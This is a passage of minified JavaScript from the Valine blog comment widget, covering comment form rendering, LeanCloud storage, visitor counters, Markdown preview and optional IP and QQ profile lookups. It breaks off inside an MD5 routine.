e=window.getComputedStyle(n,null);"vertical"===e.resize?n.style.resize="none":"both"===e.resize&&(n.style.resize="horizontal"),r="content-box"===e.boxSizing?-(parseFloat(e.paddingTop)+parseFloat(e.paddingBottom)):parseFloat(e.borderTopWidth)+parseFloat(e.borderBottomWidth),isNaN(r)&&(r=0),a()}()}}function a(n){var e=o.get(n);e&&e.destroy()}function r(n){var e=o.get(n);e&&e.update()}var o="function"==typeof Map?new Map:function(){var n=[],e=[];return{has:function(e){return n.indexOf(e)>-1},get:function(t){return e[n.indexOf(t)]},set:function(t,a){-1===n.indexOf(t)&&(n.push(t),e.push(a))},delete:function(t){var a=n.indexOf(t);a>-1&&(n.splice(a,1),e.splice(a,1))}}}(),i=function(n){return new Event(n,{bubbles:!0})};try{new Event("test")}catch(n){i=function(n){var e=document.createEvent("Event");return e.initEvent(n,!0,!1),e}}var s=null;"undefined"==typeof window||"function"!=typeof window.getComputedStyle?((s=function(n){return n}).destroy=function(n){return n},s.update=function(n){return n}):((s=function(n,e){return n&&Array.prototype.forEach.call(n.length?n:[n],(function(n){return t(n)})),n}).destroy=function(n){return n&&Array.prototype.forEach.call(n.length?n:[n],a),n},s.update=function(n){return n&&Array.prototype.forEach.call(n.length?n:[n],r),n}),e.default=s,n.exports=e.default},void 0!==(o="function"==typeof a?a.apply(e,r):a)&&(n.exports=o)},function(n,e,t){"use strict";function a(n){return n&&n.__esModule?n:{default:n}}function r(n){return!!n&&this.init(n),this}function o(n){return new r(n)}var i=a(t(32)),s=a(t(24)),l=a(t(27)),c=a(t(8)),p=t(3),d=a(t(31)),u=a(t(26)),m=t(30),h=a(t(28)),g=a(t(2)),f=a(t(29)),b=a(t(9)),v={comment:"",nick:"",mail:"",link:"",ua:g.default.ua,url:"",QQAvatar:""},y="",x={},w={cdn:"https://gravatar.loli.net/avatar/",ds:["mp","identicon","monsterid","wavatar","robohash","retro",""],params:"",hide:!1};r.prototype.init=function(n){if("undefined"==typeof document)throw new Error("Sorry, Valine does not support Server-side rendering.");var e=this;return n&&(n=g.default.extend(p.CONFIG,n),e.i18n=(0,l.default)(n.lang||g.default.lang,n.langMode),e.cfg=n,c.default.maps=!!n.emojiMaps&&n.emojiMaps||c.default.maps,c.default.cdn=!!n.emojiCDN&&n.emojiCDN||c.default.cdn,e._init()),e},r.prototype._init=function(){var n=this;try{var e=n.cfg,t=e.avatar,a=e.avatarForce,r=e.avatar_cdn,o=e.avatarCDN,i=e.visitor,s=e.path,l=void 0===s?location.pathname:s,c=e.pageSize,d=e.recordIP,f=o||r;n.cfg.path=l.replace(/index\.html?$/,"");var b=w.ds,y=a?"&q="+(0,p.RandomStr)():"";w.params="?d="+(b.indexOf(t)>-1?t:"mp")+"&v="+p.VERSION+y,w.hide="hide"===t,w.cdn=/^https?\:\/\//.test(f)?f:w.cdn,n.cfg.pageSize=isNaN(c)||c<1?10:c,d&&(0,m.recordIPFn)((function(n){return v.ip=n}));var x=n.cfg.el||null,k=(0,g.default)(x);if(x=x instanceof HTMLElement?x:k[k.length-1]||null){n.$el=(0,g.default)(x),n.$el.addClass("v").attr("data-class","v"),w.hide&&n.$el.addClass("hide-avatar"),n.cfg.meta=(n.cfg.guest_info||n.cfg.meta||p.defaultMeta).filter((function(n){return p.defaultMeta.indexOf(n)>-1})),n.cfg.requiredFields=n.cfg.requiredFields.filter((function(n){return p.defaultMeta.indexOf(n)>-1}));var C=(0==n.cfg.meta.length?p.defaultMeta:n.cfg.meta).map((function(e){var t="mail"==e?"email":"text";return p.defaultMeta.indexOf(e)>-1?'<input name="'+e+'" placeholder="'+n.i18n.t(e)+'" class="v'+e+' vinput" type="'+t+'">':""})),T='<div class="vpanel"><div class="vwrap"><p class="cancel-reply text-right" style="display:none;" title="'+n.i18n.t("cancelReply")+'"><svg class="vicon cancel-reply-btn" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4220" width="22" height="22"><path d="M796.454 985H227.545c-50.183 0-97.481-19.662-133.183-55.363-35.7-35.701-55.362-83-55.362-133.183V227.545c0-50.183 19.662-97.481 55.363-133.183 35.701-35.7 83-55.362 133.182-55.362h568.909c50.183 0 97.481 19.662 133.183 55.363 35.701 35.702 55.363 83 55.363 133.183v568.909c0 50.183-19.662 97.481-55.363 133.183S846.637 985 796.454 985zM227.545 91C152.254 91 91 152.254 91 227.545v568.909C91 871.746 152.254 933 227.545 933h568.909C871.746 933 933 871.746 933 796.454V227.545C933 152.254 871.746 91 796.454 91H227.545z" p-id="4221"></path><path d="M568.569 512l170.267-170.267c15.556-15.556 15.556-41.012 0-56.569s-41.012-15.556-56.569 0L512 455.431 341.733 285.165c-15.556-15.556-41.012-15.556-56.569 0s-15.556 41.012 0 56.569L455.431 512 285.165 682.267c-15.556 15.556-15.556 41.012 0 56.569 15.556 15.556 41.012 15.556 56.569 0L512 568.569l170.267 170.267c15.556 15.556 41.012 15.556 56.569 0 15.556-15.556 15.556-41.012 0-56.569L568.569 512z" p-id="4222" ></path></svg></p><div class="vheader item'+C.length+'">'+C.join("")+'</div><div class="vedit"><textarea id="veditor" class="veditor vinput" placeholder="'+n.cfg.placeholder+'"></textarea><div class="vrow"><div class="vcol vcol-60 status-bar"></div><div class="vcol vcol-40 vctrl text-right"><span title="'+n.i18n.t("emoji")+'"  class="vicon vemoji-btn"><svg  viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="16172" width="22" height="22" ><path d="M512 1024a512 512 0 1 1 512-512 512 512 0 0 1-512 512zM512 56.888889a455.111111 455.111111 0 1 0 455.111111 455.111111 455.111111 455.111111 0 0 0-455.111111-455.111111zM312.888889 512A85.333333 85.333333 0 1 1 398.222222 426.666667 85.333333 85.333333 0 0 1 312.888889 512z" p-id="16173"></path><path d="M512 768A142.222222 142.222222 0 0 1 369.777778 625.777778a28.444444 28.444444 0 0 1 56.888889 0 85.333333 85.333333 0 0 0 170.666666 0 28.444444 28.444444 0 0 1 56.888889 0A142.222222 142.222222 0 0 1 512 768z" p-id="16174"></path><path d="M782.222222 391.964444l-113.777778 59.733334a29.013333 29.013333 0 0 1-38.684444-10.808889 28.444444 28.444444 0 0 1 10.24-38.684445l113.777778-56.888888a28.444444 28.444444 0 0 1 38.684444 10.24 28.444444 28.444444 0 0 1-10.24 36.408888z" p-id="16175"></path><path d="M640.568889 451.697778l113.777778 56.888889a27.875556 27.875556 0 0 0 38.684444-10.24 27.875556 27.875556 0 0 0-10.24-38.684445l-113.777778-56.888889a28.444444 28.444444 0 0 0-38.684444 10.808889 28.444444 28.444444 0 0 0 10.24 38.115556z" p-id="16176"></path></svg></span><span title="'+n.i18n.t("preview")+'" class="vicon vpreview-btn"><svg  viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="17688" width="22" height="22"><path d="M502.390154 935.384615a29.538462 29.538462 0 1 1 0 59.076923H141.430154C79.911385 994.461538 29.538462 946.254769 29.538462 886.153846V137.846154C29.538462 77.745231 79.950769 29.538462 141.390769 29.538462h741.218462c61.44 0 111.852308 48.206769 111.852307 108.307692v300.268308a29.538462 29.538462 0 1 1-59.076923 0V137.846154c0-26.899692-23.355077-49.230769-52.775384-49.230769H141.390769c-29.420308 0-52.775385 22.331077-52.775384 49.230769v748.307692c0 26.899692 23.355077 49.230769 52.775384 49.230769h360.999385z" p-id="17689"></path><path d="M196.923077 216.615385m29.538461 0l374.153847 0q29.538462 0 29.538461 29.538461l0 0q0 29.538462-29.538461 29.538462l-374.153847 0q-29.538462 0-29.538461-29.538462l0 0q0-29.538462 29.538461-29.538461Z" p-id="17690"></path><path d="M649.846154 846.769231a216.615385 216.615385 0 1 0 0-433.230769 216.615385 216.615385 0 0 0 0 433.230769z m0 59.076923a275.692308 275.692308 0 1 1 0-551.384616 275.692308 275.692308 0 0 1 0 551.384616z" p-id="17691"></path><path d="M807.398383 829.479768m20.886847-20.886846l0 0q20.886846-20.886846 41.773692 0l125.321079 125.321079q20.886846 20.886846 0 41.773693l0 0q-20.886846 20.886846-41.773693 0l-125.321078-125.321079q-20.886846-20.886846 0-41.773693Z" p-id="17692"></path></svg></span></div></div></div><div class="vrow"><div class="vcol vcol-30" ><a alt="Markdown is supported" href="https://guides.github.com/features/mastering-markdown/" class="vicon" target="_blank"><svg class="markdown" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.85 3H1.15C.52 3 0 3.52 0 4.15v7.69C0 12.48.52 13 1.15 13h13.69c.64 0 1.15-.52 1.15-1.15v-7.7C16 3.52 15.48 3 14.85 3zM9 11H7V8L5.5 9.92 4 8v3H2V5h2l1.5 2L7 5h2v6zm2.99.5L9.5 8H11V5h2v3h1.5l-2.51 3.5z"></path></svg></a></div><div class="vcol vcol-70 text-right"><button type="button"  title="Cmd|Ctrl+Enter" class="vsubmit vbtn">'+n.i18n.t("submit")+'</button></div></div><div class="vemojis" style="display:none;"></div><div class="vinput vpreview" style="display:none;"></div></div></div><div class="vcount" style="display:none;"><span class="vnum">0</span> '+n.i18n.t("comments")+'</div><div class="vload-top text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vcards"></div><div class="vload-bottom text-center" style="display:none;"><i class="vspinner" style="width:30px;height:30px;"></i></div><div class="vempty" style="display:none;"></div><div class="vpage txt-center" style="display:none"><button type="button" class="vmore vbtn">'+n.i18n.t("more")+'</button></div><div class="vpower txt-right">Powered By <a href="https://valine.js.org" target="_blank">Valine</a><br>v'+p.VERSION+"</div>";n.$el.html(T),n.$el.find(".cancel-reply").on("click",(function(e){n.reset()}));var j=n.$el.find(".vempty");n.$nodata={show:function(e){return j.html(e||n.i18n.t("sofa")).show(),n},hide:function(){return j.hide(),n}};var P=n.$el.find(".vload-bottom"),A=n.$el.find(".vload-top");n.$loading={show:function(e){return e&&A.show()||P.show(),n.$nodata.hide(),n},hide:function(){return A.hide(),P.hide(),0===n.$el.find(".vcard").length&&n.$nodata.show(),n}}}(0,u.default)(n.cfg,(function(e){var t=(0,g.default)(".valine-comment-count"),a=0;!function e(t){var r=t[a++];if(r){var o=(0,g.default)(r).attr("data-xid");o&&n.Q(o).count().then((function(n){r.innerText=n,e(t)})).catch((function(n){r.innerText=0}))}}(t),i&&S.add(AV.Object.extend("Counter"),n.cfg.path),n.$el&&n.bind()}))}catch(e){(0,h.default)(n,e,"init")}};var k=function(n,e){var t=new n,a=new AV.ACL;a.setPublicReadAccess(!0),a.setPublicWriteAccess(!0),t.setACL(a),t.set("url",e.url),t.set("xid",e.xid),t.set("title",e.title),t.set("time",1),t.save().then((function(n){(0,g.default)(e.el).find(".leancloud-visitors-count").text(1)})).catch((function(n){}))},S={add:function(n,e){var t=this,a=(0,g.default)(".leancloud_visitors,.leancloud-visitors");if(1===a.length){var r=a[0],o=decodeURI((0,g.default)(r).attr("id")),i=(0,g.default)(r).attr("data-flag-title"),s=encodeURI(o),l={el:r,url:o,xid:s,title:i};if(decodeURI(o)===decodeURI(e)){var c=new AV.Query(n);c.equalTo("url",o),c.find().then((function(e){if(e.length>0){var t=e[0];t.increment("time"),t.save().then((function(n){(0,g.default)(r).find(".leancloud-visitors-count").text(n.get("time"))})).catch((function(n){}))}else k(n,l)})).catch((function(e){101==e.code?k(n,l):(0,h.default)(t,e)}))}else S.show(n,a)}else S.show(n,a)},show:function(n,e){var t=[];if(e.forEach((function(n){var e=(0,g.default)(n).find(".leancloud-visitors-count");e&&e.text("0"),t.push(/\%/.test((0,g.default)(n).attr("id"))?decodeURI((0,g.default)(n).attr("id")):(0,g.default)(n).attr("id"))})),t.length){var a=new AV.Query(n);a.containedIn("url",t),a.find().then((function(n){n.length>0&&e.forEach((function(e){n.forEach((function(n){var t=n.get("xid")||encodeURI(n.get("url")),a=n.get("time"),r=(0,g.default)(e),o=r.attr("id");if((/\%/.test(o)?o:encodeURI(o))==t){var i=r.find(".leancloud-visitors-count");i&&i.text(a)}}))}))})).catch((function(n){}))}}};r.prototype.Q=function(n){var e=this,t=arguments.length,a=e.cfg.clazzName;if(1==t){var r=new AV.Query(a);r.doesNotExist("rid");var o=new AV.Query(a);o.equalTo("rid","");var i=AV.Query.or(r,o);return"*"===n?i.exists("url"):i.equalTo("url",decodeURI(n)),i.addDescending("createdAt"),i.addDescending("insertedAt"),i}var s=JSON.stringify(arguments[1]).replace(/(\[|\])/g,""),l="select * from "+a+" where rid in ("+s+") order by -createdAt,-createdAt";return AV.Query.doCloudQuery(l)},r.prototype.installLocale=function(n,e){return this.i18n(n,e),this},r.prototype.setPath=function(n){return this.config.path=n,this},r.prototype.bind=function(){var n=this,e=n.$el.find(".vemojis"),t=n.$el.find(".vpreview"),a=n.$el.find(".vemoji-btn"),r=n.$el.find(".vpreview-btn"),o=n.$el.find(".veditor"),l=c.default.maps,u=!1;n.$emoji={show:function(){return!u&&function(n){var t=[];for(var a in l)l.hasOwnProperty(a)&&c.default.build(a)&&t.push('<i title="'+a+'" >'+c.default.build(a)+"</i>");e.html(t.join("")),u=!0,e.find("i").on("click",(function(n){n.preventDefault(),A(o[0]," :"+(0,g.default)(this).attr("title")+":")}))}(),n.$preview.hide(),e.show(),a.addClass("actived"),n.$emoji},hide:function(){return a.removeClass("actived"),e.hide(),n.$emoji}},n.$preview={show:function(){return y?(n.$emoji.hide(),r.addClass("actived"),t.html((0,f.default)(y)).show(),O()):n.$preview.hide(),n.$preview},hide:function(){return r.removeClass("actived"),t.hide().html(""),n.$preview}};var k=function(e){var a=e.val()||"";a||n.$preview.hide(),y!=a&&(y=a,r.hasClass("actived")>-1&&y!=t.html()&&t.html((0,f.default)(y)),O())};a.on("click",(function(e){a.hasClass("actived")?n.$emoji.hide():n.$emoji.show()})),r.on("click",(function(e){r.hasClass("actived")?n.$preview.hide():n.$preview.show()}));var S=n.cfg.meta,C={},T={veditor:"comment"};for(var j in S.forEach((function(n){T["v"+n]=n})),T)T.hasOwnProperty(j)&&function(){var e=T[j],t=n.$el.find("."+j);C[e]=t,t.on("input change blur propertychange",(function(a){n.cfg.enableQQ&&"blur"===a.type&&"nick"===e&&(t.val()&&!isNaN(t.val())?(0,m.fetchQQFn)(t.val(),(function(n){var e=n.nick||t.val(),a=n.qq+"@qq.com";(0,g.default)(".vnick").val(e),(0,g.default)(".vmail").val(a),v.nick=e,v.mail=a,v.QQAvatar=n.pic})):g.default.store.get(p.QQCacheKey)&&g.default.store.get(p.QQCacheKey).nick!=t.val()&&(g.default.store.remove(p.QQCacheKey),v.nick=t.val(),v.mail="",v.QQAvatar="")),"comment"===e?((0,s.default)(t[0]),P((function(n){k(t)}))()):v[e]=(0,b.default)(t.val().replace(/(^\s*)|(\s*$)/g,"").substring(0,35))}))}();var P=function(n){var e=arguments.length>1&&void 0!==arguments[1]?arguments[1]:300,t=void 0;return function(){var a=this,r=arguments;t&&clearTimeout(t),t=setTimeout((function(){n.apply(a,r)}),e)}},A=function(n,e){if(document.selection)n.focus(),document.selection.createRange().text=e,n.focus();else if(n.selectionStart||"0"==n.selectionStart){var t=n.selectionStart,a=n.selectionEnd,r=n.scrollTop;n.value=n.value.substring(0,t)+e+n.value.substring(a,n.value.length),n.focus(),n.selectionStart=t+e.length,n.selectionEnd=t+e.length,n.scrollTop=r}else n.focus(),n.value+=e;P((function(e){k((0,g.default)(n))}))()},E={no:1,size:n.cfg.pageSize,skip:n.cfg.pageSize},_=n.$el.find(".vpage");_.on("click",(function(n){_.hide(),E.no++,B()}));var B=function(){var e=E.size,t=E.no,a=Number(n.$el.find(".vnum").text());n.$loading.show();var r=n.Q(n.cfg.path);r.limit(e),r.skip((t-1)*e),r.find().then((function(r){if(E.skip=E.size,r&&r.length){var o=[];r.forEach((function(e){o.push(e.id),z(e,n.$el.find(".vcards"),!0)})),n.Q(n.cfg.path,o).then((function(n){(n&&n.results||[]).forEach((function(n){z(n,(0,g.default)('.vquote[data-self-id="'+n.get("rid")+'"]'))}))})).catch((function(n){})),e*t<a?_.show():_.hide(),O()}else n.$nodata.show();n.$loading.hide()})).catch((function(e){n.$loading.hide(),(0,h.default)(n,e,"query")}))};n.Q(n.cfg.path).count().then((function(e){e>0?(n.$el.find(".vcount").show().find(".vnum").text(e),B()):n.$loading.hide()})).catch((function(e){(0,h.default)(n,e,"count")}));var I=function(){var n=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"",e=/(https?|http):\/\/[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]/g,t=n.match(e)||[];return t.length>0?t[0]:""},z=function(e,t,a){var r=(0,g.default)('<div class="vcard" id="'+e.id+'"></div>'),o=(0,b.default)(e.get("ua")),s="";o&&!/ja/.test(n.cfg.lang)&&(s=(o=g.default.detect(o)).version?o.os?'<span class="vsys">'+o.browser+" "+o.version+'</span> <span class="vsys">'+o.os+" "+o.osVersion+"</span>":"":'<span class="vsys">'+o.browser+"</span>"),"*"===n.cfg.path&&(s='<a href="'+e.get("url")+'" class="vsys">'+e.get("url")+"</a>");var l=e.get("link")?/^https?\:\/\//.test(e.get("link"))?e.get("link"):"http://"+e.get("link"):"",c=g.default.escape((0,b.default)(e.get("nick").substring(0,30))),p=l?'<a class="vnick" rel="nofollow" href="'+I(l)+'" target="_blank" >'+c+"</a>":'<span class="vnick">'+c+"</span>",u=(w.hide?"":n.cfg.enableQQ&&e.get("QQAvatar")?(0,b.default)('<img class="vimg" src="'+I(e.get("QQAvatar"))+'" referrerPolicy="no-referrer"/>'):'<img class="vimg" src="'+(w.cdn+(0,i.default)(e.get("mail"))+w.params)+'">')+'<div class="vh"><div class="vhead">'+p+" "+s+'</div><div class="vmeta"><span class="vtime" >'+(0,d.default)(e.get("insertedAt"),n.i18n)+'</span><span class="vat" data-vm-id="'+(e.get("rid")||e.id)+'" data-self-id="'+e.id+'">'+n.i18n.t("reply")+'</span></div><div class="vcontent" data-expand="'+n.i18n.t("expand")+'">'+(0,f.default)(e.get("comment"))+'</div><div class="vreply-wrapper" data-self-id="'+e.id+'"></div><div class="vquote" data-self-id="'+e.id+'"></div></div>';r.html(u);var m=r.find(".vat");r.find("a:not(.at)").forEach((function(n){(0,g.default)(n).attr({target:"_blank",rel:"noopener"})})),a?t.append(r):t.prepend(r);var h=r.find(".vcontent");h&&L(h),m&&F(m,e)},D={},F=function(e,t){e.on("click",(function(a){var r=e.attr("data-vm-id"),o=e.attr("data-self-id"),i=n.$el.find(".vwrap"),s="@"+g.default.escape(t.get("nick"));(0,g.default)('.vreply-wrapper[data-self-id="'+o+'"]').append(i).find(".cancel-reply").show(),D={at:g.default.escape(s)+" ",rid:r,pid:o,rmail:t.get("mail")},C.comment.attr({placeholder:s})[0].focus()}))},O=function(){setTimeout((function(){try{n.cfg.mathjax&&"MathJax"in window&&"version"in window.MathJax&&(/^3.*/.test(window.MathJax.version)&&MathJax.typeset()||MathJax.Hub.Queue(["Typeset",MathJax.Hub,document.querySelector(".v")])),"renderMathInElement"in window&&renderMathInElement((0,g.default)(".v")[0],{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})}catch(n){}}),100)},L=function(n){setTimeout((function(){n[0].offsetHeight>200&&(n.addClass("expand"),n.on("click",(function(e){n.removeClass("expand")})))}))};!function(e){if(e=g.default.store.get(p.MetaCacheKey)||e)for(var t in S)if(S.hasOwnProperty(t)){var a=S[t];n.$el.find(".v"+a).val(g.default.unescape(e[a])),v[a]=e[a]}var r=g.default.store.get(p.QQCacheKey);v.QQAvatar=n.cfg.enableQQ&&!!r&&r.pic||""}(),n.reset=function(){v.comment="",C.comment.val(""),k(C.comment),C.comment.attr("placeholder",n.cfg.placeholder),D={},n.$preview.hide(),n.$el.find(".vpanel").append(n.$el.find(".vwrap")),n.$el.find(".cancel-reply").hide(),y="",s.default.update(C.comment[0])};var M=n.$el.find(".vsubmit"),N=function(e){if(n.cfg.requiredFields.indexOf("nick")>-1&&v.nick.length<1)return C.nick[0].focus(),void n.$el.find(".status-bar").text(""+n.i18n.t("nickFail")).empty(3e3);if(n.cfg.requiredFields.indexOf("mail")>-1&&!/[\w-\.]+@([\w-]+\.)+[a-z]{2,3}/.test(v.mail))return C.mail[0].focus(),void n.$el.find(".status-bar").text(""+n.i18n.t("mailFail")).empty(3e3);if(""!=y){for(var t in x)if(x.hasOwnProperty(t)){var a=x[t];y=y.replace(t,a),URL.revokeObjectURL(t)}x={},v.comment=(0,b.default)(y),v.nick=v.nick||"Anonymous";var r=g.default.store.get("vlx");r&&Date.now()/1e3-r/1e3<20?n.$el.find(".status-bar").text(n.i18n.t("busy")).empty(3e3):R()}else C.comment[0].focus()},R=function(){g.default.store.set("vlx",Date.now()),M.attr({disabled:!0}),n.$loading.show(!0);var e=new(AV.Object.extend(n.cfg.clazzName||"Comment"));if(v.url=decodeURI(n.cfg.path),v.insertedAt=new Date,D.rid){var t=D.pid||D.rid;e.set("rid",D.rid),e.set("pid",t),v.comment=y.replace("<p>",'<p><a class="at" href="#'+t+'">'+D.at+"</a> , ")}for(var a in v)if(v.hasOwnProperty(a)){var r=v[a];e.set(a,r)}e.setACL(function(){var n=new AV.ACL;return n.setPublicReadAccess(!0),n.setPublicWriteAccess(!1),n}()),e.save().then((function(e){"Anonymous"!=v.nick&&g.default.store.set(p.MetaCacheKey,{nick:v.nick,link:v.link,mail:v.mail});var t=n.$el.find(".vnum");try{D.rid?z(e,(0,g.default)('.vquote[data-self-id="'+D.rid+'"]'),!0):(Number(t.text())?t.text(Number(t.text())+1):n.$el.find(".vcount").show().find(".vnum").text(Number(t.text())+1),z(e,n.$el.find(".vcards")),E.skip++),M.removeAttr("disabled"),n.$loading.hide(),n.reset(),"onCommentSubmitted"in n.cfg&&g.default.isFunction(n.cfg.onCommentSubmitted)&&n.cfg.onCommentSubmitted(v)}catch(e){(0,h.default)(n,e,"save")}})).catch((function(e){(0,h.default)(n,e,"commitEvt")}))};M.on("click",N),(0,g.default)(document).on("keydown",(function(n){var e=(n=window.event||n).keyCode||n.which||n.charCode;(n.ctrlKey||n.metaKey)&&13===e&&N(),9===e&&"veditor"==(document.activeElement.id||"")&&(n.preventDefault(),A(o[0],"    "))})).on("paste",(function(n){var e="clipboardData"in n?n.clipboardData:n.originalEvent&&n.originalEvent.clipboardData||window.clipboardData;e&&q(e.items,!0)})),o.on("dragenter dragleave dragover drop",(function(n){n.stopPropagation(),n.preventDefault(),"drop"===n.type&&q(n.dataTransfer.items)}));var q=function(n,e){for(var t=0,a=n.length;t<a;t++){var r=n[t];if("string"===r.kind&&r.type.match("^text/html"))!e&&r.getAsString((function(n){n&&A(o[0],n.replace(/<[^>]+>/g,""))}));else if(r.type.indexOf("image")>-1){U(r.getAsFile());continue}}},U=function(n){try{var e=URL.createObjectURL(n),t="![image]("+e+") ",a=new FileReader;A(o[0],t),a.onload=function(){x[e]=a.result},a.readAsDataURL(n)}catch(n){}}},n.exports=o,n.exports.default=o},function(n,e,t){"use strict";e.__esModule=!0;var a=function(n){return n&&n.__esModule?n:{default:n}}(t(2)),r=!1;e.default=function(n,e){if("AV"in window){var t=window.AV.version||window.AV.VERSION;parseInt(t.split(".")[0])>2?r=!!AV.applicationId&&!!AV.applicationKey:a.default.deleteInWin("AV",0)}r?e&&e():a.default.sdkLoader("//github.elemecdn.com/leancloud-storage@3/dist/av-min.js","AV",(function(t){var a,o="https://",i=n.app_id||n.appId,s=n.app_key||n.appKey;if(!n.serverURLs)switch(i.slice(-9)){case"-9Nh9j0Va":o+="tab.";break;case"-MdYXbMMI":o+="us."}a=n.serverURLs||o+"leancloud.cn",AV.init({appId:i,appKey:s,serverURLs:a}),r=!0,e&&e()}))}},function(n,e,t){"use strict";function a(n){return n&&n.__esModule?n:{default:n}}e.__esModule=!0;var r=a(t(53)),o=a(t(67)),i=a(t(68)),s=a(t(65)),l=a(t(66)),c={zh:o.default,"zh-cn":o.default,"zh-CN":o.default,"zh-TW":i.default,en:s.default,"en-US":s.default,ja:l.default,"ja-JP":l.default};e.default=function(n,e){return!c[n]&&n&&e&&(c[n]=e),new r.default({phrases:c[n||"zh"],locale:n})}},function(n,e,t){"use strict";e.__esModule=!0,e.default=function(n,e){if(n.$el&&n.$loading.hide().$nodata.hide(),"[object Error]"==={}.toString.call(e)){var t=e.code||e.message||e.error||"";if(isNaN(t))n.$el&&n.$nodata.show('<pre style="text-align:left;"> '+JSON.stringify(e)+"</pre>");else{var a=n.i18n.t("code-"+t),r=(a=="code-"+t?void 0:a)||e.message||e.error||"";101==t||-1==t?n.$nodata.show():n.$el&&n.$nodata.show('<pre style="text-align:left;">Code '+t+": "+r+"</pre>")}}else n.$el&&n.$nodata.show('<pre style="text-align:left;">'+JSON.stringify(e)+"</pre>")}},function(n,e,t){"use strict";function a(n){return n&&n.__esModule?n:{default:n}}e.__esModule=!0;var r=t(52),o=a(t(48)),i=a(t(2)),s=a(t(8)),l=a(t(9)),c=new r.marked.Renderer;c.code=function(n,e){return'<pre><code class="hljs language-'+e+'">'+(e&&hljs.getLanguage(e)?hljs.highlight(e,n).value:i.default.escape(n))+"</code></pre>"},r.marked.setOptions({renderer:"hljs"in window?c:new r.marked.Renderer,highlight:function(n,e){return"hljs"in window?e&&hljs.getLanguage(e)&&hljs.highlight(e,n,!0).value||hljs.highlightAuto(n).value:(0,o.default)(n)},gfm:!0,tables:!0,breaks:!0,pedantic:!1,sanitize:!1,smartLists:!0,smartypants:!0,headerPrefix:"v-"}),e.default=function(n){return(0,l.default)((0,r.marked)(s.default.parse(n,!0)))}},function(n,e,t){"use strict";e.__esModule=!0,e.recordIPFn=e.fetchQQFn=void 0;var a=function(n){return n&&n.__esModule?n:{default:n}}(t(2)),r=t(3);e.fetchQQFn=function(n,e){var t=a.default.store.get(r.QQCacheKey);t&&t.qq==n?e&&e(t):a.default.ajax({url:"//valine.api.ioliu.cn/getqqinfo",method:"POST",body:{qq:n}}).then((function(n){n.json().then((function(n){n.errmsg||(a.default.store.set(r.QQCacheKey,n),e&&e(n))}))}))},e.recordIPFn=function(n){a.default.ajax({url:"//pubstatic.b0.upaiyun.com/?_upnode&t="+Date.now(),method:"get"}).then((function(n){return n.json()})).then((function(e){var t=e.remote_addr;n&&n(t)}))}},function(n,e,t){"use strict";e.__esModule=!0,e.default=function(n,e){if(!n)return"Invalid Date.";try{var t=r(n).getTime();if(isNaN(t))return"Invalid Date.";var o=(new Date).getTime()-t,i=Math.floor(o/864e5);if(0===i){var s=o%864e5,l=Math.floor(s/36e5);if(0===l){var c=s%36e5,p=Math.floor(c/6e4);if(0===p){var d=c%6e4;return Math.round(d/1e3)+" "+e.t("seconds")}return p+" "+e.t("minutes")}return l+" "+e.t("hours")}return i<0?e.t("now"):i<8?i+" "+e.t("days"):a(n)}catch(n){}};var a=function(n){var e=o(n.getDate(),2),t=o(n.getMonth()+1,2);return o(n.getFullYear(),2)+"-"+t+"-"+e},r=function n(e){return e instanceof Date?e:!isNaN(e)||/^\d+$/.test(e)?new Date(parseInt(e)):/GMT/.test(e||"")?n(new Date(e).getTime()):(e=(e||"").replace(/(^\s*)|(\s*$)/g,"").replace(/\.\d+/,"").replace(/-/,"/").replace(/-/,"/").replace(/(\d)T(\d)/,"$1 $2").replace(/Z/," UTC").replace(/([+-]\d\d):?(\d\d)/," $1$2"),new Date(e))},o=function(n,e){for(var t=n.toString();t.length<e;)t="0"+t;return t}},function(n,e,t){var a;!function(r){"use strict";function o(n,e){var t=(65535&n)+(65535&e);return(n>>16)+(e>>16)+(t>>16)<<16|65535&t}function i(n,e,t,a,r,i){return o(function(n,e){return n<<e|n>>>32-e}(o(o(e,n),o(a,i)),r),t)}function s(n,e,t,a,r,o,s){return i(e&t|~e&a,n,e,r,o,s)}function l(n,e,t,a,r,o,s){return i(e&a|t&~a,n,e,r,o,s)}function c(n,e,t,a,r,o,s){return i(e^t^a,n,e,r,o,s)}function p(n,e,t,a,r,o,s){return i(t^(e|~a),n,e,r,o,s)}function d(n,e){n[e>>5]|=128<<e%32,n[14+(e+64>>>9<<4)]=e;var t,a,r,i,d,u=1732584193,m=-271733879,h=-1732584194,g=271733878;for(t=0;t<n.length;t+=16)a=u,r=m,i=h,d=g,u=s(u,m,h,g,n[t],7,-680876936),g=s(g,u,m,h,n[t+1],12,-389564586),h=s(h,g,u,m,n[t+2],17,606105819),m=s(m,h,g,u,n[t+3],22,-1044525330),u=s(u,m,h,g,n[t+4],7,-176418897),g=s(g,u,m,h,n[t+5],12,1200080426),h=s(h,g,u,m,n[t+6],17,-1473231341),m=s(m,h,g,u,n[t+7],22,-45705983),u=s(u,m,h,g,n[t+8],7,1770035416),g=s(g,u,m,h,n[t+9],12,-1958414417),h=s(h,g,u,m,n[t+10],17,-42063),m=s(m,h,g,u,n[t+11],22,-1990404162),u=s(u,m,h,g,n[t+12],7,1804603682),g=s(g,u,m,h,n[t+13],12,-40341101),h=s(h,g,u,m,n[t+14],17,-1502002290),u=l(u,m=s(m,h,g,u,n[t+15],22,1236535329),h,g,n[t+1],5,-165796510),g=l(g,u,m,h,n[t+6],9,-1069501632),h=l(h,g,u,m,n[t+11],14,643717713),m=l(m,h,g,u,n[t],20,-373897302),u=l(u,m,h,g,n[t+5],5,-701558691),g=l(g,u,m,h,n[t+10],9,38016083),h=l(h,g,u,m,n[t+15],14,-660478335),m=l(m,h,g,u,n[t+4],20,-405537848),u=l(u,m,h,g,n[t+9],5,568446438),g=l(g,u,m,h,n[t+14],9,-1019803690),h=l(h,g,u,m,n[t+3],14,-187363961),m=l(m,h,g,u,n[t+8],20,1163531501),u=l(u,m,h,g,n[t+13],5,-1444681467),g=l(g,u,m,h,n[t+2],9,-51403784),h=l(h,g,u,m,n[t+7],14,1735328473),